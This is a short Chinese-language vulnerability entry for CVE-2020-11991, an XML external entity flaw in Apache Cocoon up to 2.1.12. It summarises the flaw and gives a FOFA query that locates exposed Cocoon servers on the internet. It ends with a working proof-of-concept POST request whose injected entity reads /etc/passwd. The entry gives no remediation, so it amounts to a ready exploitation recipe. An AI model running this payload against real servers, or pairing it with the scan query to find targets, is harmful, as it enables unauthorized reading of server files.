---
Title: Apache Cocoon XML注入 CVE-2020-11991
---

# Apache Cocoon XML注入 CVE-2020-11991

 

## 漏洞描述 

9月11日 Apache 软件基金会发布安全公告，修复了 Apache Cocoon xml外部实体注入漏洞（CVE-2020-11991）。

Apache Cocoon 是一个基于 Spring 框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon 通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。

 

##  影响版本 

<a-checkbox checked>Apache Cocoon <= 2.1.12</a-checkbox></br>

 

## 网络测绘 

<a-checkbox checked>
<a-button href="https://fofa.info/result?qbase64=YXBwPSJBcGFjaGUtQ29jb29uIg%3D%3D">app="Apache-Cocoon"</a-button>
</a-checkbox>

## 漏洞复现 

验证POC

```xml
POST /v2/api/product/manger/getInfo 

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userInfo>
<firstName>John</firstName> 
<lastName>&ent;</lastName>
</userInfo>
```



